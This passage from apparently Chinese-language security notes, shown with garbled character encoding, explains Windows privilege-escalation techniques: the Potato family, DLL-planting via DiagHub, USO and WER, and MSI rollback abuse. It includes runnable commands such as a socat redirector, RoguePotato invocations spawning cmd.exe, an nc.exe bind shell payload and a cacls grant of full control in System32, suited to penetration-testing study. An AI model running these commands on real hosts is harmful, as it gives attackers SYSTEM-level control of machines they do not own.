  <li>åå°æ™ºèƒ½ä¼ è¾“æœåŠ¡(BITS) å¯ä¾›ç¨‹åºå‘˜å’Œç³»ç»Ÿç®¡ç†å‘˜ç”¨äºä» HTTP Web æœåŠ¡å™¨å’Œ SMB æ–‡ä»¶å…±äº«ä¸‹è½½æ–‡ä»¶æˆ–å°†æ–‡ä»¶ä¸Šä¼ åˆ°å…¶ä¸­ã€‚
    <ol>
      <li>Windows Updateï¼š BITS æœåŠ¡ç”¨äºä¸‹è½½å’Œå®‰è£… Windows æ›´æ–°ã€‚</li>
      <li>Windows Defender ç—…æ¯’å®šä¹‰æ›´æ–°ï¼š BITS ç”¨äºåå°æ›´æ–° Windows Defender ç—…æ¯’å®šä¹‰ã€‚</li>
      <li>åº”ç”¨ç¨‹åºå’Œç³»ç»Ÿæ›´æ–°ï¼š ç¬¬ä¸‰æ–¹åº”ç”¨ç¨‹åºå’Œç³»ç»Ÿç»„ä»¶å¯ä»¥åˆ©ç”¨ BITS è¿›è¡Œåå°æ›´æ–°ã€‚</li>
    </ol>
  </li>
  <li>
    <h2 id="clsidæ˜¯æ ‡è¯†-com-ç±»å¯¹è±¡çš„å…¨å±€å”¯ä¸€æ ‡è¯†ç¬¦å®ƒæ˜¯ä¸€ä¸ªç±»ä¼¼uuidçš„æ ‡è¯†ç¬¦">CLSIDæ˜¯æ ‡è¯† COM ç±»å¯¹è±¡çš„å…¨å±€å”¯ä¸€æ ‡è¯†ç¬¦ã€‚å®ƒæ˜¯ä¸€ä¸ªç±»ä¼¼UUIDçš„æ ‡è¯†ç¬¦ã€‚</h2>
  </li>
</ol>

<h3 id="juicy-potato">Juicy Potato</h3>
<p>Rotten Potato çš„ PoC ä½¿ç”¨äº† COM æ¥æ¿€æ´» BITS æœåŠ¡ã€‚Windows åœ¨ä¿®è¡¥ Rotten Potato æ—¶ï¼Œç¦ç”¨äº† BITS æœåŠ¡ï¼Œå¹¶ä¸”å ç”¨äº† 6666 ç«¯å£ï¼Œä½†è¯¥ä¿®è¡¥å¹¶ä¸èƒ½å®Œå…¨æœç»è¿™ç±»é—®é¢˜ï¼Œä½œè€…æ‰¾åˆ°äº†å…¶ä»–å¯ä»¥é€‰æ‹©çš„ COM å¯¹è±¡ï¼Œä¹Ÿå¯ä»¥å‘èµ· NTLM è¯·æ±‚ã€‚</p>

<p>å…¶å…·ä½“åˆ©ç”¨è¿‡ç¨‹ä¸ Rotten Potato ç±»ä¼¼ï¼š</p>
<ol>
  <li>Juicy Potato é€šè¿‡ä¼ é€’ BITS çš„ CLSID å’Œ IStorage å¯¹è±¡å®ä¾‹ç»™ CoGetInstanceFromIStorage å‡½æ•°ï¼Œä½¿å¾— rpcss æ¿€æ´» BITS æœåŠ¡ã€‚</li>
  <li>éšå rpcss çš„ DCOM OXID resolver ä¼šè§£æåºåˆ—åŒ–æ•°æ®ä¸­çš„ OBJREF æ‹¿åˆ°DUALSTRINGARRAY å­—æ®µï¼Œè¯¥å­—æ®µæŒ‡å®šäº† host[port] æ ¼å¼çš„ locationï¼Œç»‘å®šå¯¹è±¡æ—¶ä¼šå‘å…¶ä¸­çš„ host[port] å‘é€ DEC/RPC è¯·æ±‚ï¼Œè¿™æ—¶ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶äº†è¿™ä¸ªç«¯å£ï¼Œå°±å¯ä»¥è¦æ±‚è¿›è¡Œ NTLM èº«ä»½éªŒè¯ï¼Œé‚£ä¹ˆé«˜æƒé™æœåŠ¡å°±ä¼šå‘é€ net-NTLM è¿›è¡Œè®¤è¯ã€‚</li>
  <li>å…¶åçš„è¿‡ç¨‹ä¸ Rotten Potato ä¸€è‡´</li>
</ol>

<p>å½±å“èŒƒå›´ï¼š</p>
<ul>
  <li>&lt; Windows 10 1809</li>
  <li>&lt; Windows Server 2019</li>
</ul>

<h3 id="pipe-potatoprintspoofer">Pipe Potatoï¼ˆPrintSpooferï¼‰</h3>
<p><strong>å‘½åç®¡é“ææƒåŸç†</strong>ï¼š
windows ä¸­æœ‰ä¸€ä¸ª API ImpersonateNamedPipeClient()ï¼Œå…è®¸æœåŠ¡ç«¯è¿›ç¨‹å¯¹è¿æ¥åˆ°å®ƒçš„å®¢æˆ·ç«¯è¿›ç¨‹è¿›è¡Œæ¨¡æ‹Ÿã€‚é€šè¿‡è°ƒç”¨ ImpersonateNamedPipeClient()ï¼Œå‘½åç®¡é“æœåŠ¡ç«¯å¯ä»¥æ¨¡æ‹Ÿå‘½åç®¡é“å®¢æˆ·ç«¯çš„å®‰å…¨ä¸Šä¸‹æ–‡ï¼Œä»è€Œç›´æ¥å°†å‘½åç®¡é“æœåŠ¡ç«¯å½“å‰çº¿ç¨‹çš„ Token ä»¤ç‰Œæ›´æ”¹ä¸ºå‘½åç®¡é“å®¢æˆ·ç«¯çš„ Tokenä»¤ç‰Œã€‚</p>

<p>å› æ­¤å‘½åç®¡é“ææƒçš„åŸç†å¤§å¤šç±»ä¼¼ï¼Œä¸€èˆ¬æ˜¯è¯±ä½¿ system æƒé™çš„æœåŠ¡è®¿é—®æˆ‘ä»¬åˆ›å»ºçš„å‘½åç®¡é“ã€‚</p>

<p><strong>PrintSpoofer åŸç†</strong>ï¼š</p>

<p>Windows çš„ MS-RPRN åè®®ç”¨äºæ‰“å°å®¢æˆ·æœºå’Œæ‰“å°æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡ï¼Œé»˜è®¤æƒ…å†µä¸‹å¯ç”¨ã€‚åŒæ—¶ï¼ŒPrint Spooler æœåŠ¡çš„ RPC æ¥å£æš´éœ²åœ¨å‘½åç®¡é“ï¼š\.\pipe\spoolss ä¸­ï¼Œè¯¥æœåŠ¡é»˜è®¤å¼€å¯ã€‚</p>

<p>MS-RPRN åè®®å®šä¹‰çš„ RpcRemoteFindFirstPrinterChangeNotificationEx() å‡½æ•°åˆ›å»ºä¸€ä¸ªè¿œç¨‹æ›´æ”¹é€šçŸ¥å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ç›‘è§†å¯¹æ‰“å°æœºå¯¹è±¡çš„æ›´æ”¹ï¼Œå¹¶å°†æ›´æ”¹é€šçŸ¥å‘é€åˆ°æ‰“å°å®¢æˆ·ç«¯ï¼Œå¹¶ä¸”å°±æ˜¯é€šè¿‡å‘½åç®¡é“å®ç°è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ã€‚</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="n">RpcRemoteFindFirstPrinterChangeNotificationEx</span><span class="p">(</span> 
    <span class="cm">/* [in] */</span> <span class="n">PRINTER_HANDLE</span> <span class="n">hPrinter</span><span class="p">,</span>
    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">fdwFlags</span><span class="p">,</span>
    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">fdwOptions</span><span class="p">,</span>
    <span class="cm">/* [unique][string][in] */</span> <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">pszLocalMachine</span><span class="p">,</span>
    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">dwPrinterLocal</span><span class="p">,</span>
    <span class="cm">/* [unique][in] */</span> <span class="n">RPC_V2_NOTIFY_OPTIONS</span> <span class="o">*</span><span class="n">pOptions</span><span class="p">)</span>

</code></pre></div></div>
<p>å…¶ä¸­ pszLocalMachine æ˜¯æŒ‡å‘è¡¨ç¤ºå®¢æˆ·ç«¯è®¡ç®—æœºåç§°çš„å­—ç¬¦ä¸²çš„æŒ‡é’ˆï¼Œéœ€è¦ä¼ é€’ä¸€ä¸ª UNC è·¯å¾„ï¼Œä¼ é€’ \127.0.0.1 æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè®¿é—® \127.0.0.1\pipe\spoolssï¼Œä½†è¿™ä¸ªç®¡é“å·²ç»è¢«ç³»ç»Ÿæ³¨å†Œäº†ï¼Œå¹¶ç”± NT AUTHORITY\SYSTEM æ§åˆ¶ã€‚å¦‚æœæˆ‘ä»¬ä¼ å…¥æ˜¯ \127.0.0.1\pipe\demoï¼Œ spoolsv.exe è¿›ç¨‹ä¹Ÿä¼šå¯¹Server nameåšäº†æ ¡éªŒï¼Œæœ€åè¿˜æ˜¯ä¼šæ›¿æ¢æˆ \192.168.110.137\pipe\spools ç®¡é“ã€‚</p>

<p>ä½œè€…åœ¨è¿™é‡Œåˆ©ç”¨äº† windows UNC è·¯å¾„è§„èŒƒåŒ–çš„æŠ€å·§ç»•è¿‡äº†è¿™ä¸ªé™åˆ¶</p>

<p>è€ƒè™‘åˆ° UNC è·¯å¾„çš„æ€§è´¨ï¼Œå¦‚æœä¸»æœºååŒ…å« /ï¼Œå®ƒå°†é€šè¿‡è·¯å¾„æ£€æŸ¥ï¼Œä½†çœŸæ­£è¿æ¥çš„æ—¶å€™ä¼šè½¬åŒ–ä¸º \ ã€‚é‚£ä¹ˆï¼Œå¦‚æœä¼ é€’ä¸€ä¸ª \127.0.0.1/pipe/fooï¼Œæ£€æŸ¥æ—¶ä¼šè®¤ä¸º 127.0.0.1/pipe/foo æ˜¯ä¸€ä¸ªä¸»æœºåï¼Œéšååœ¨è¿æ¥ named pipe æ—¶ä¼šå¯¹å‚æ•°åšæ ‡å‡†åŒ–ï¼Œäºæ˜¯å°±ä¼šè¿æ¥ \127.0.0.1\pipe\foo\pipe\spoolssï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥æŠŠä¸»æœºåæ”¹ä¸º \127.0.0.1/pipe/foo å¹¶æ³¨å†Œè¿™ä¸ª named pipe ä»è€Œçªƒå– client çš„ tokenã€‚</p>

<p>åˆ©ç”¨å·¥å…·ï¼š</p>
<ul>
  <li><a href="https://github.com/itm4n/PrintSpoofer">itm4n/PrintSpoofer: Abusing impersonation privileges through the â€œPrinter Bugâ€</a></li>
</ul>

<p>å‚è€ƒï¼š</p>
<ul>
  <li><a href="https://paper.seebug.org/2090/">Windows å‘½åç®¡é“å®¢æˆ·ç«¯æ¨¡æ‹Ÿå’Œ PrintSpoofer åŸç†æ¢ç©¶</a></li>
</ul>

<h3 id="bad-potato">Bad Potato</h3>
<p>BadPotatoæ˜¯C#ç‰ˆæœ¬çš„PrintSpoolerï¼Œç»“æ„ä»£ç ä¹Ÿæ›´åŠ ç®€åŒ–ï¼Œå¹¶ä¸”æ¶æ„ç®¡é“æœåŠ¡ç«¯ç”¨çš„æ˜¯å¯¹æ–¹æœºå™¨çš„åå­—ï¼Œè€ŒPrintSpoolerç”¨çš„æ˜¯éšæœºç”Ÿæˆçš„UUIDï¼ŒpipePotatoåˆ™æ˜¯å›ºå®šçš„â€xxxâ€ï¼ˆå¯¼è‡´å¯ç”¨æ€§ä¹Ÿæ›´ä½ï¼‰</p>

<p>åˆ©ç”¨å·¥å…·ï¼š</p>
<ul>
  <li><a href="https://github.com/BeichenDream/BadPotato">BeichenDream/BadPotato: Windows æƒé™æå‡ BadPotato</a></li>
</ul>

<h3 id="rogue-potato">Rogue Potato</h3>
<p>ä¸ºäº†ä¿®è¡¥ Juicy Potatoï¼Œé«˜ç‰ˆæœ¬çš„ Windows DCOM è§£æå™¨ä¸å…è®¸ OBJREF ä¸­çš„ DUALSTRINGARRAY å­—æ®µæŒ‡å®šç«¯å£å·ã€‚</p>

<p><strong>åˆ©ç”¨æ¡ä»¶ï¼š</strong></p>
<ol>
  <li>æˆ‘ä»¬éœ€è¦æœ‰ä¸€å°æœºå™¨åœ¨æˆ‘ä»¬çš„æ§åˆ¶ä¹‹ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å…¶ä¸­æ‰§è¡Œé‡å®šå‘ï¼Œå¹¶ä¸”å—å®³è€…å¿…é¡»å¯ä»¥åœ¨ç«¯å£ 135ä¸Šè®¿é—®è¯¥æœºå™¨</li>
  <li>æˆ‘ä»¬éœ€è¦ä¸Šä¼ ä¸¤ä¸ª exe æ–‡ä»¶ï¼Œå½“å—å®³è€…çš„é˜²ç«å¢™ä¸æ¥å—ä¼ å…¥è¿æ¥æ—¶ï¼Œä¹Ÿå¯ä»¥åœ¨æˆ‘ä»¬æ§åˆ¶çš„ Windows æœºå™¨ä¸Šä»¥ç‹¬ç«‹æ¨¡å¼å¯åŠ¨ä¼ªé€ çš„ OXID è§£æå™¨</li>
</ol>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231120041332.png" alt="20231120041332" /></p>

<p>åˆ©ç”¨æ€è·¯ï¼š</p>
<ol>
  <li>
    <p>Rogue Potato çš„åˆ©ç”¨æ€è·¯æ˜¯åœ¨è¿œç¨‹æœåŠ¡å™¨çš„ 135 ç«¯å£ä¸Šåšä¸€ä¸ªè½¬å‘ï¼Œç”¨äºå°† OXID è§£æè¯·æ±‚é‡å®šå‘åˆ°ä¸€ä¸ªå‡çš„OXID RPC æœåŠ¡å™¨ã€‚</p>
  </li>
  <li>
    <p>ä¼ªé€ çš„OXID RPC æœåŠ¡å™¨å®ç°äº†ResolveOxid2æœåŠ¡å™¨è¿‡ç¨‹ï¼Œè¯¥è¿‡ç¨‹å°†æŒ‡å‘å—æ§å‘½åç®¡é“[ncacn_np:localhost/pipe/roguepotato[\pipe\epmapper]</p>
  </li>
  <li>
    <p>DCOM æœåŠ¡å™¨å°†è¿æ¥åˆ° RPC æœåŠ¡å™¨ä»¥æ‰§è¡Œ IRemUnkown2 æ¥å£è°ƒç”¨ã€‚é€šè¿‡è¿æ¥åˆ°å‘½åç®¡é“ï¼Œå°†æ‰§è¡Œâ€èº«ä»½éªŒè¯å›è°ƒâ€ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ RpcImpersonateClient()è°ƒç”¨æ¨¡æ‹Ÿè°ƒç”¨è€…ã€‚</p>
  </li>
  <li>
    <p>ç„¶å,ä»¤ç‰Œçªƒå–è€…
  1.è·å–rpcssæœåŠ¡çš„PID
  2.æ‰“å¼€è¿›ç¨‹ï¼Œåˆ—å‡ºæ‰€æœ‰å¥æŸ„ï¼Œå¹¶ä¸ºæ¯ä¸ªå¥æŸ„å°è¯•å¤åˆ¶å®ƒå¹¶è·å–å¥æŸ„ç±»å‹
  3.å¦‚æœå¥æŸ„ç±»å‹ä¸ºâ€Tokenâ€ä¸”ä»¤ç‰Œæ‰€æœ‰è€…ä¸º SYSTEMï¼Œåˆ™å°è¯•ä½¿ç”¨CreatProcessAsUser()æˆ–CreateProcessWithToken()æ¨¡æ‹Ÿå¹¶å¯åŠ¨è¿›ç¨‹</p>
  </li>
</ol>

<p><strong>å½±å“èŒƒå›´ï¼š</strong></p>
<ul>
  <li>&gt;= Windows 10 1809 &amp; Windows Server 2019</li>
</ul>

<p>åˆ©ç”¨å·¥å…·ï¼š</p>
<ul>
  <li>https://github.com/antonioCoco/RoguePotato</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Network redirector / port forwarder to run on your remote machine, must use port 135 as src port</span>
socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999

<span class="c"># RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. </span>
<span class="c"># Use this if you have fw restrictions.</span>
RoguePotato.exe <span class="nt">-r</span> 10.0.0.3 <span class="nt">-e</span> <span class="s2">"C:</span><span class="se">\w</span><span class="s2">indows</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">md.exe"</span>

<span class="c"># RoguePotato all in one with RogueOxidResolver running locally on port 9999</span>
RoguePotato.exe <span class="nt">-r</span> 10.0.0.3 <span class="nt">-e</span> <span class="s2">"C:</span><span class="se">\w</span><span class="s2">indows</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">md.exe"</span> <span class="nt">-l</span> 9999

<span class="c">#RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename</span>
RoguePotato.exe <span class="nt">-r</span> 10.0.0.3 <span class="nt">-e</span> <span class="s2">"C:</span><span class="se">\w</span><span class="s2">indows</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">md.exe"</span> <span class="nt">-l</span> 9999 <span class="nt">-c</span> <span class="s2">"{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}"</span> <span class="nt">-p</span> splintercode
</code></pre></div></div>

<h3 id="efspotatopetitpotam">EfsPotatoï¼ˆPetitPotamï¼‰</h3>
<p>åˆ©ç”¨EFSRPCï¼ˆåŠ å¯†æ–‡ä»¶ç³»ç»Ÿè¿œç¨‹åè®®ï¼‰ï¼Œè¿›è¡ŒNTLMä¸­ç»§æ”»å‡»å¯å®ç°ADåŸŸå†…æƒé™æå‡æˆ–æœ¬åœ°æƒé™æå‡ã€‚</p>

<p>å½±å“èŒƒå›´ï¼š
    Windows Server, version 20H2 (Server Core Installation)
    Windows Server, version 2004 (Server Core installation)
    Windows Server 2019  (Server Core installation)
    Windows Server 2019
    Windows Server 2016  (Server Core installation)
    Windows Server 2016
    Windows Server 2012 R2 (Server Core installation)
    Windows Server 2012 R2
    Windows Server 2012 (Server Core installation)
    Windows Server 2012
    Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for x64-based Systems Service Pack 2
    Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for 32-bit Systems Service Pack 2
    Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
    Windows Server 2008 R2 for x64-based Systems Service Pack 1</p>

<p>åˆ©ç”¨å·¥å…·ï¼š</p>
<ul>
  <li><a href="https://github.com/zcgonvh/EfsPotato">zcgonvh/EfsPotato: Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability).</a></li>
  <li><a href="https://github.com/bugch3ck/SharpEfsPotato">bugch3ck/SharpEfsPotato: Local privilege escalation from SeImpersonatePrivilege using EfsRpc.</a></li>
</ul>

<h3 id="ghost-potatoms08-068-ç»•è¿‡">Ghost potatoï¼ˆMS08-068 ç»•è¿‡ï¼‰</h3>
<p>ä¸ºé˜²æ­¢ç”¨æˆ· relay æœ¬æœºï¼Œåœ¨ lsass ä¸­æ·»åŠ ç¼“å­˜ç»•è¿‡ï¼Œå¦‚æœç¼“å­˜ä¸­æœ‰ (Challenge,cifs/B) å°±ä¼šè®¤è¯å¤±è´¥ã€‚
ç„¶è€Œè¿™ä¸ª (Challenge,cifs/B) æ˜¯æœ‰æ—¶æ•ˆæ€§çš„ï¼ˆ300sï¼‰ï¼Œæ‰€æœ‰åªè¦ç­‰ 300s å†å‘é€ type3 å°±å¯ä»¥ bypass äº†ã€‚</p>

<p>ç”¨ä¿®æ”¹åçš„ impacket https://shenaniganslabs.io/files/impacket-ghostpotato.zip å¯ä»¥ç›´æ¥æ‰“ï¼Œç”¨æ³•å’ŒMS08-068 ç±»ä¼¼ã€‚</p>

<h3 id="sweet-potato">Sweet Potato</h3>
<p>é›†æˆäº†å‰é¢å‡ ç§åœŸè±†è§¦å‘ NTLM è®¤è¯çš„æ–¹å¼ï¼ŒåŒ…æ‹¬ï¼šCOMï¼ŒWinRMï¼ŒSpoolsvï¼Œå…¶ä¸­ WInRM çš„æ”»å‡»åŸç†å‚è€ƒï¼šhttps://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/</p>

<p>å¤§è‡´æ€è·¯å°±æ˜¯å½“ WinRM åœ¨å½“å‰ç³»ç»Ÿæœªå¯ç”¨æ—¶ï¼Œæ”»å‡»è€…ç›‘å¬æœ¬æœº 5985 ç«¯å£ï¼ŒBITS æœåŠ¡ä¼šå‘ WinRM 5985 å‘èµ· NTLM è®¤è¯ã€‚</p>

<ul>
  <li>RottenPotato</li>
  <li>Weaponized JuciyPotato with BITS WinRM discovery</li>
  <li>PrintSpoofer discovery and original exploit</li>
  <li>EfsRpc built on EfsPotato</li>
  <li>PetitPotam</li>
</ul>

<p>åˆ©ç”¨å·¥å…·ï¼š<a href="https://github.com/CCob/SweetPotato">CCob/SweetPotato: Local Service to SYSTEM privilege escalation from Windows 7 to Windows 10 / Server 2019</a></p>

<h3 id="generic-potato">Generic Potato</h3>

<p>SweetPotato çš„ä¿®æ”¹ç‰ˆæœ¬ï¼Œ æ˜¯@micahvandeusen ç”¨äºæ”¯æŒé€šè¿‡ HTTP å’Œ/æˆ–å‘½åç®¡é“æ¨¡æ‹Ÿèº«ä»½éªŒè¯ã€‚</p>

<p>è¿™å…è®¸ä» SSRF å’Œ/æˆ–æ–‡ä»¶å†™å…¥è¿›è¡Œæœ¬åœ°æƒé™å‡çº§ã€‚ åœ¨ä»¥ä¸‹æƒ…å†µä¸‹å®ƒå¾ˆæ–¹ä¾¿ï¼š</p>

<ol>
  <li>æˆ‘ä»¬æœ‰æƒè®¿é—®çš„ç”¨æˆ·æ‹¥æœ‰ SeImpersonatePrivilege</li>
  <li>ç³»ç»Ÿæ²¡æœ‰è¿è¡Œæ‰“å°æœåŠ¡ï¼Œè¿™ä¼šé˜»æ­¢ SweetPotato ã€‚</li>
  <li>WinRM æ­£åœ¨è¿è¡Œä»¥é˜²æ­¢ RogueWinRM</li>
  <li>æ‚¨ä¸å…è®¸å¯¹æ‚¨æ§åˆ¶çš„ä»»ä½•è®¡ç®—æœºè¿›è¡Œå‡ºç«™ RPCï¼Œå¹¶ä¸”ç¦ç”¨ BITS æœåŠ¡ä»¥é˜²æ­¢ RoguePotato ã€‚</li>
</ol>

<p>åˆ©ç”¨å·¥å…·ï¼š</p>
<ul>
  <li><a href="https://github.com/micahvandeusen/GenericPotato">micahvandeusen/GenericPotato: Impersonating authentication over HTTP and/or named pipes.</a></li>
</ul>

<h3 id="juicypotatong">JuicyPotatoNG</h3>
<ul>
  <li><a href="https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/">Giving JuicyPotato a second chance: JuicyPotatoNG â€“ Decoderâ€™s Blog</a></li>
</ul>

<p>åˆ©ç”¨å·¥å…·ï¼š</p>
<ul>
  <li><a href="https://github.com/antonioCoco/JuicyPotatoNG">antonioCoco/JuicyPotatoNG: Another Windows Local Privilege Escalation from Service Account to System</a></li>
</ul>

<h3 id="godpotato">GodPotato</h3>
<p>å½±å“èŒƒå›´ï¼š</p>
<ul>
  <li>Windows Server 2012 - Windows Server 2022</li>
  <li>Windows8 - Windows 11</li>
</ul>

<p>åˆ©ç”¨å·¥å…·ï¼š</p>
<ul>
  <li><a href="https://github.com/BeichenDream/GodPotato">BeichenDream/GodPotato</a></li>
</ul>

<h3 id="é¶åœº">é¶åœº</h3>
<ul>
  <li>Juicy Potato - HackTheBox-Jeeves</li>
  <li>Rogue Potato - HackTheBox-Remote</li>
</ul>

<p>å‚è€ƒï¼š</p>
<ul>
  <li><a href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc">Potatoes - Windows Privilege Escalation Â· Jorge Lajara Website</a></li>
  <li><a href="https://www.geekby.site/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/#2-hot-potato">Potato å®¶æ—ææƒåˆ†æ - Geekbyâ€™s Blog</a></li>
  <li><a href="https://blog.csdn.net/qq_42045349/article/details/118225426">ã€ç²¾é€‰ã€‘Rotten/Juicy Potatoææƒå·¥åŸç†åˆ†æ_rottenpotato-CSDNåšå®¢</a></li>
  <li><a href="http://moonflower.fun/index.php/2022/05/01/329/">Potato å®¶æ—ææƒå­¦ä¹ </a></li>
  <li><a href="https://blog.csdn.net/qq_41874930/article/details/108825010">NTLM-relayæ”»å‡»çš„åŸç†ä¸å®ç°</a></li>
  <li><a href="https://paper.seebug.org/2090/">Windows å‘½åç®¡é“å®¢æˆ·ç«¯æ¨¡æ‹Ÿå’Œ PrintSpoofer åŸç†æ¢ç©¶</a></li>
</ul>

<h2 id="é€šè¿‡ç‰¹æƒæ–‡ä»¶å†™å…¥ææƒ">é€šè¿‡ç‰¹æƒæ–‡ä»¶å†™å…¥ææƒ</h2>
<h3 id="diaghub">DiagHub</h3>
<blockquote>
  <p>ä»ç‰ˆæœ¬ 1903 åŠæ›´é«˜ç‰ˆæœ¬å¼€å§‹ï¼ŒDiagHub ä¸èƒ½å†ç”¨äºåŠ è½½ä»»æ„ DLLã€‚</p>
</blockquote>

<p>Microsoft è¯Šæ–­ä¸­å¿ƒæ ‡å‡†æ”¶é›†å™¨æœåŠ¡ (DiagHub) æ˜¯ä¸€é¡¹æ”¶é›†è·Ÿè¸ªä¿¡æ¯å¹¶é€šè¿‡ DCOM ä»¥ç¼–ç¨‹æ–¹å¼å…¬å¼€çš„æœåŠ¡ã€‚</p>

<p>è¯¥ DCOM å¯¹è±¡å¯ç”¨äºå°† DLL åŠ è½½åˆ° SYSTEM è¿›ç¨‹ä¸­ï¼Œå‰ææ˜¯è¯¥ DLL å­˜åœ¨äº C:\Windows\System32 ç›®å½•ä¸­ã€‚</p>

<p>åˆ©ç”¨æ­¥éª¤ï¼š</p>
<ol>
  <li>åˆ›å»ºä¸€ä¸ªé‚ªæ¶çš„ DLL ä¾‹å¦‚ï¼špayload.dll å¹¶å°†å…¶ç§»è‡³ C:\Windows\System32</li>
  <li>build https://github.com/xct/diaghub</li>
  <li>diaghub.exe c:\ProgramData\ Payload.dll</li>
</ol>

<p>é»˜è®¤æœ‰æ•ˆè´Ÿè½½å°†è¿è¡Œ C:\Windows\System32\spool\drivers\color\nc.exe -lvp 2000 -e cmd.exe</p>

<h3 id="usodllloader">UsoDLLLoader</h3>
<blockquote>
  <p>2020-06-06 æ›´æ–°ï¼šæ­¤æŠ€å·§ä¸å†é€‚ç”¨äºæœ€æ–°ç‰ˆæœ¬çš„ Windows 10 Insider Previewã€‚</p>
</blockquote>

<p>å¦‚æœæˆ‘ä»¬åœ¨ Windows æˆ–æŸäº›ç¬¬ä¸‰æ–¹è½¯ä»¶ä¸­å‘ç°ç‰¹æƒæ–‡ä»¶å†™å…¥æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥å°†è‡ªå·±ç‰ˆæœ¬çš„ windowscoredeviceinfo.dll å¤åˆ¶åˆ° C:\Windows\Sytem32\ä¸­ï¼Œç„¶åè®© USO æœåŠ¡ä»¥ NT AUTHORITY\System çš„èº«ä»½åŠ è½½å®ƒã€‚</p>

<p>åˆ©ç”¨æ­¥éª¤ï¼š</p>
<ol>
  <li>æ„å»º https://github.com/itm4n/UsoDllLoader
    <ol>
      <li>é€‰æ‹©å‘å¸ƒé…ç½®å’Œ x64 æ¶æ„ã€‚</li>
      <li>æ„å»ºè§£å†³æ–¹æ¡ˆã€‚
        <ol>
          <li>DLL .\x64\Release\WindowsCoreDeviceInfo.dll</li>
          <li>åŠ è½½ç¨‹åº.\x64\Release\UsoDllLoader.exeã€‚</li>
        </ol>
      </li>
    </ol>
  </li>
  <li>å°† WindowsCoreDeviceInfo.dll å¤åˆ¶åˆ° C:\Windows\System32\</li>
  <li>ä½¿ç”¨åŠ è½½ç¨‹åºå¹¶ç­‰å¾… shell æˆ–è¿è¡Œ usoclient StartInteractiveScan å¹¶è¿æ¥åˆ°ç«¯å£ 1337 ä¸Šçš„ç»‘å®š shellã€‚</li>
</ol>

<h3 id="wertrigger">WerTrigger</h3>
<p>åˆ©ç”¨ Windows é—®é¢˜æŠ¥å‘Šå†™å…¥ç‰¹æƒã€‚</p>

<p>åˆ©ç”¨æ­¥éª¤ï¼š</p>
<ol>
  <li>å…‹éš† https://github.com/sailay1996/WerTrigger</li>
  <li>å°† phoneinfo.dll å¤åˆ¶åˆ°C:\Windows\System32\</li>
  <li>å°† Report.wer æ–‡ä»¶å’Œ WerTrigger.exe æ”¾åœ¨åŒä¸€ç›®å½•ä¸­ã€‚</li>
  <li>ç„¶åï¼Œè¿è¡Œ WerTrigger.exeã€‚</li>
  <li>äº«å— NT AUTHORITY\SYSTEM çš„ shell</li>
</ol>

<h3 id="wermgr">WerMgr</h3>
<p>åˆ©ç”¨ Windows é”™è¯¯æŠ¥å‘Šçš„ç‰¹æƒç›®å½•åˆ›å»ºé”™è¯¯è¾¾æˆææƒ</p>

<p>åˆ©ç”¨æ­¥éª¤ï¼š</p>
<ol>
  <li>Clone https://github.com/binderlabs/DirCreate2System</li>
  <li>Create directory C:\Windows\System32\wermgr.exe.local\</li>
  <li>Grant access to it: cacls C:\Windows\System32\wermgr.exe.local /e /g everyone:f</li>
  <li>Place spawn.dll file and dircreate2system.exe in a same directory and run .\dircreate2system.exe.</li>
  <li>Enjoy a shell as NT AUTHORITY\SYSTEM</li>
</ol>

<h2 id="é€šè¿‡ç‰¹æƒæ–‡ä»¶åˆ é™¤ææƒ">é€šè¿‡ç‰¹æƒæ–‡ä»¶åˆ é™¤ææƒ</h2>
<p>åœ¨ MSI å®‰è£…æœŸé—´ï¼ŒWindows Installer æœåŠ¡ä¼šç»´æŠ¤æ¯ä¸ªæ›´æ”¹çš„è®°å½•ï¼Œä»¥é˜²éœ€è¦å›æ»šï¼Œä¸ºæ­¤å®ƒå°†åˆ›å»ºï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> C:\Config.Msi ä¸­çš„æ–‡ä»¶å¤¹åŒ…å«
     å›æ»šè„šæœ¬ (.rbs)
     å›æ»šæ–‡ä»¶ (.rbf)
</code></pre></div></div>

<p>è¦å°†ç‰¹æƒæ–‡ä»¶åˆ é™¤è½¬æ¢ä¸ºæœ¬åœ°æƒé™æå‡ï¼Œæ‚¨éœ€è¦æ»¥ç”¨ Windows Installer æœåŠ¡ã€‚</p>

